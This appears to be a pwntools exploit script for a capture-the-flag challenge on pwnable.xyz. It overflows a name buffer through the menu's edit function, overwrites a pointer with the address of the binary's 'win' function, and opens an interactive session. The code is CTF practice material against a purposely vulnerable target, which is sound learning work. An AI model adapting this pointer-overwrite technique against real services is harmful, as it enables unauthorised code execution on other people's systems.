#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30023)
#gdb.attach(p)
elf = ELF("./challenge")

def write_name(name):
    p.sendlineafter("> ", '1')
    p.sendafter("name: ", name)

def edit_name(index, name):
    p.sendlineafter("> ", '2')
    p.sendafter("index: ", str(index))
    p.sendafter("name: ", name)

def print_name(index):
    p.sendlineafter("> ", '3')
    p.sendafter("index: ", str(index))
    

write_name('A'*0x20)
edit_name(0, 'C'*0x20 + '\x30')
edit_name(0, 'D'*0x28 + p64(elf.symbols['win']))
print_name(0)
#gdb.attach(p)
p.interactive()
